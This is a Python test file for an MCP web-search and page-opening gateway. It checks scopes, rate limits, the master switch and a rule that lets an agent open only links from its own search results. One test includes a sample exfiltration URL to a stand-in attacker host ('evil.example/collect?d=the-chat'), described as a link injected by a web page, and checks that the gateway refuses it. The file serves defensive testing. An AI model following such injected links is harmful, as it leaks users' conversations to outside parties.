"""Web tools for apps: the MCP endpoint POST /tools/mcp on the gateway, the `web` scope, the per-token provenance rule,
the master switch, the limits, and the stdio bridge (bin/outcrop-web-mcp)."""
import json
import os
import subprocess
import sys
import threading
import time
from http.server import ThreadingHTTPServer

import httpx
import pytest

from conftest import ROOT, Stack
from outcrop.common import db
from outcrop.gateway import webmcp
from test_chat import Fetch, Searx, UnixHTTP

URL = "/tools/mcp"


@pytest.fixture
def stack(tmp_path):
    Searx.queries.clear()
    Fetch.opened.clear()
    searx = ThreadingHTTPServer(("127.0.0.1", 0), Searx)
    threading.Thread(target=searx.serve_forever, daemon=True).start()
    fsock = tmp_path / "fetch.sock"
    fetch = UnixHTTP(str(fsock), Fetch)
    threading.Thread(target=fetch.serve_forever, daemon=True).start()
    s = Stack(tmp_path)
    s.gw.webmcp = webmcp.WebMCP(f"http://127.0.0.1:{searx.server_address[1]}", fsock)
    s.reload()
    yield s
    s.stop()
    searx.shutdown()
    fetch.shutdown()


def rpc(stack, tok, method, params=None, mid=1):
    msg = {"jsonrpc": "2.0", "method": method, **({"id": mid} if mid is not None else {}), **({"params": params} if params else {})}
    return httpx.post(stack.url + URL, json=msg, headers={"Authorization": f"Bearer {tok}"}, timeout=30)


def call(stack, tok, name, **args):
    r = rpc(stack, tok, "tools/call", {"name": name, "arguments": args})
    assert r.status_code == 200, r.text
    res = r.json()["result"]
    return res["isError"], res["content"][0]["text"]


def test_handshake_and_tools(stack):
    tok = stack.token("harness", scopes=["inference", "web"])
    r = rpc(stack, tok, "initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                       "clientInfo": {"name": "dsh", "version": "0"}})
    res = r.json()["result"]
    assert res["protocolVersion"] == "2025-06-18" and res["capabilities"]["tools"] == {"listChanged": False}
    assert res["serverInfo"]["name"] == "outcrop-web" and "instructions" in res
    assert rpc(stack, tok, "initialize", {"protocolVersion": "1999-01-01"}).json()["result"]["protocolVersion"] == "2025-11-25"
    assert rpc(stack, tok, "notifications/initialized", mid=None).status_code == 202
    names = [t["name"] for t in rpc(stack, tok, "tools/list").json()["result"]["tools"]]
    assert names == ["web_search", "open_page"]
    assert rpc(stack, tok, "ping").json()["result"] == {}
    assert rpc(stack, tok, "nope").json()["error"]["code"] == -32601
    assert httpx.post(stack.url + URL, content=b"[1,2]", headers={"Authorization": f"Bearer {tok}"}).status_code == 400
    assert httpx.get(stack.url + URL, headers={"Authorization": f"Bearer {tok}"}).status_code == 405


def test_search_then_open_only_its_results(stack):
    tok = stack.token("harness", scopes=["inference", "web"])
    err, text = call(stack, tok, "web_search", query="boiler pressure")
    assert not err and "[1] Result 1 for boiler pressure" in text and "https://a1.example/page" in text
    assert "<<<web content" in text and "[[" not in text
    err, text = call(stack, tok, "open_page", url="https://a1.example/page")
    assert not err and "PAGE TEXT of https://a1.example/page" in text
    # a link a page told it to open, never searched: refused, never fetched
    err, text = call(stack, tok, "open_page", url="https://evil.example/collect?d=the-chat")
    assert err and "Refused" in text and Fetch.opened == ["https://a1.example/page"]
    # another token cannot open the first token's results
    other = stack.token("other", scopes=["web"])
    err, _ = call(stack, other, "open_page", url="https://a1.example/page")
    assert err and len(Fetch.opened) == 1
    # the request log shows each call
    stack.flush()
    rows = stack.con.execute("SELECT model, route_class, status FROM requests WHERE path='/tools/mcp' ORDER BY started_at").fetchall()
    assert ("tools/call web_search", "web", 200) in [tuple(r) for r in rows]


def test_needs_the_web_scope_and_a_token(stack):
    tok = stack.token("chat-only")                                   # inference only
    assert rpc(stack, tok, "tools/list").status_code == 403
    assert httpx.post(stack.url + URL, json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).status_code == 401
    # open mode never covers the web tools
    stack.set("auth.mode", {"mode": "open", "until": time.time() + 60, "at": time.time()})
    assert httpx.post(stack.url + URL, json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).status_code == 401


def test_master_switch_and_any_link(stack):
    tok = stack.token("harness", scopes=["web"])
    stack.set("chat.settings", {"web_allowed": False})
    err, text = call(stack, tok, "web_search", query="x")
    assert err and "turned off" in text and Searx.queries == []
    stack.set("chat.settings", {"web_allowed": True, "apps_any_link": True})
    err, text = call(stack, tok, "open_page", url="https://anything.example/")
    assert not err and Fetch.opened == ["https://anything.example/"]


def test_limits(stack, monkeypatch):
    monkeypatch.setattr(webmcp, "PER_MINUTE", 2)
    tok = stack.token("busy", scopes=["web"])
    assert not call(stack, tok, "web_search", query="a")[0]
    assert not call(stack, tok, "web_search", query="b")[0]
    err, text = call(stack, tok, "web_search", query="c")
    assert err and "a minute" in text and Searx.queries == ["a", "b"]


def test_the_stdio_bridge(stack, tmp_path):
    tok = stack.token("bridge", scopes=["web"])
    msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}},
            {"jsonrpc": "2.0", "method": "notifications/initialized"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "web_search", "arguments": {"query": "q"}}}]
    env = {**os.environ, "OUTCROP_WEB_TOKEN": tok}
    p = subprocess.run([sys.executable, str(ROOT / "bin" / "outcrop-web-mcp"), "--url", stack.url + URL],
                       input="\n".join(json.dumps(m) for m in msgs) + "\n", capture_output=True, text=True, env=env,
                       timeout=60)
    lines = [json.loads(x) for x in p.stdout.splitlines()]
    assert [x["id"] for x in lines] == [1, 2]                         # the notification gets no answer
    assert "Result 1 for q" in lines[1]["result"]["content"][0]["text"]
    bad = subprocess.run([sys.executable, str(ROOT / "bin" / "outcrop-web-mcp"), "--url", stack.url + URL],
                         input=json.dumps(msgs[0]) + "\n", capture_output=True, text=True,
                         env={**os.environ, "OUTCROP_WEB_TOKEN": "lls_nope0000_" + "x" * 32}, timeout=60)
    assert "refused the token" in json.loads(bad.stdout)["error"]["message"]


def test_scope_can_be_granted():
    from outcrop.common import tokens
    assert tokens.norm_scopes("inference,web") == ["inference", "web"]
    assert db is not None
